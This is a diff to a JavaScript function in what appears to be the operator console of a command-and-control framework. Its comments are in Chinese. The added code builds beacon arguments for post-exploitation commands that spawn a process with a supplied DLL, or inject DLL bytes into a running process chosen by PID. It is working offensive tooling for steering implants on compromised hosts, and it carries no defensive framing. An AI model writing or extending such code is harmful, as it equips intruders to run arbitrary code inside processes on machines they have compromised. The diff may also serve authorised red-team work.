@@ -326,6 +326,42 @@ export function buildBeaconCommandArgs(commandId, args = []) {
         makeBeaconArg('int32', parseOptionalInt32Arg(source[3], 1, 'include_root')),
       ]
 
+    case COMMAND_ID.POSTEX:
+    case COMMAND_ID.POSTEX_SPAWN_DLL:
+    case COMMAND_ID.POSTEX_INJECT_DLL:
+      // Args 已由 ConsolePanel 预构建：[subcmd, wait_ms, max_runtime_ms, idle_timeout_ms, ...]
+      // postex_spawn_dll:  [5, wait_ms, max_runtime_ms, idle_timeout_ms, description, module_args, spawn_path, spawn_args, {kind:'bytes',value:b64}]
+      // postex_inject_dll: [6, wait_ms, max_runtime_ms, idle_timeout_ms, description, module_args, pid, {kind:'bytes',value:b64}]
+      {
+        const subcmd = parseInt(source[0]) || 5
+        if (subcmd === 6) {
+          const injectDllBytes = source[7]
+          return [
+            makeBeaconArg('int32', 6),
+            makeBeaconArg('int32', parseInt(source[1]) || 3000),
+            makeBeaconArg('int32', parseOptionalInt32Arg(source[2], 0, 'max_runtime_ms')),
+            makeBeaconArg('int32', parseOptionalInt32Arg(source[3], 0, 'idle_timeout_ms')),
+            makeBeaconArg('string', String(source[4] || 'postex')),
+            makeBeaconArg('string', String(source[5] || '')),
+            makeBeaconArg('int32', parseInt(source[6]) || 0),
+            ...(injectDllBytes && injectDllBytes.kind === 'bytes' ? [injectDllBytes] : []),
+          ]
+        }
+        // postex_spawn_dll (subcmd=5)
+        const spawnDllBytes = source[8]
+        return [
+          makeBeaconArg('int32', 5),
+          makeBeaconArg('int32', parseInt(source[1]) || 3000),
+          makeBeaconArg('int32', parseOptionalInt32Arg(source[2], 0, 'max_runtime_ms')),
+          makeBeaconArg('int32', parseOptionalInt32Arg(source[3], 0, 'idle_timeout_ms')),
+          makeBeaconArg('string', String(source[4] || 'postex')),
+          makeBeaconArg('string', String(source[5] || '')),
+          makeBeaconArg('string', String(source[6] || '')),
+          makeBeaconArg('string', String(source[7] || '')),
+          ...(spawnDllBytes && spawnDllBytes.kind === 'bytes' ? [spawnDllBytes] : []),
+        ]
+      }
+
     default:
       return source.map(normalizeBeaconArg)
   }
